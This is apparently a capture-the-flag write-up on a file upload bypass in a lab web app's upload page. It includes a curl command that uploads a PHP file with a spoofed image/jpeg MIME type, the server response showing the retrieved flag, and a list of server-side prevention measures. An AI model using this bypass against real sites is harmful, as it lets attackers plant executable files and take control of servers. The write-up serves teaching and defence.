# Overview

This document outlines the impact and prevention of a security breach involving file upload bypass vulnerabilities. Such vulnerabilities allow attackers to upload malicious files to a system, potentially leading to unauthorized access or control.

## Vulnerability Path
**http://<ip_address>/index.php?page=upload**

## Discovery

### How It's Usually Found

File upload vulnerabilities are typically discovered through security audits, penetration testing, and the use of automated scanning tools designed to identify security weaknesses in web applications.

### How I Discovered It

In the case of the `?page=upload` page, the vulnerability was discovered while attempting to upload different types of files. Initially, a `.php` file upload was attempted, resulting in a failure message. 

Then, using the command line, I executed a curl request to upload a file with a PHP extension, but modified the MIME type to `image/jpeg` to bypass the file upload validation:

```
curl -X POST -F "Upload=Upload" -F "uploaded=@file.php;type=image/jpeg" "http://127.0.0.1:8080/index.php?page=upload" | grep 'The flag is :'
```

The response indicated that the file was successfully uploaded, and the flag was retrieved, demonstrating the exploitation of the file upload vulnerability:

```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3030    0  2739  100   291    544     57  0:00:05  0:00:05 --:--:--   719
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/file.php succesfully uploaded.</pre>
```

## Prevention

To prevent file upload vulnerabilities, consider the following measures:

1. **Validate File Formats and Extensions**: Implement server-side validation to ensure only files with approved extensions are uploaded. Avoid relying solely on client-side validation.

2. **Use File Upload Validation Frameworks**: Employ trusted frameworks specifically designed for secure file upload validation to cover all potential exploitation vectors.

3. **Enforce File Name Restrictions**: Sanitize uploaded file names to remove dangerous characters and prevent injection attacks. Renaming files upon upload can also mitigate directory traversal vulnerabilities.

4. **Limit File Size**: Set a maximum file size and number of files that can be uploaded to prevent denial-of-service attacks through resource exhaustion.

5. **Content-Type Verification**: Ensure that the MIME type of uploaded files matches expected types for the allowed extensions, adding an additional layer of validation.

## Additional Resources

For more information on mitigating file upload vulnerabilities, the following resources may be helpful:

- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
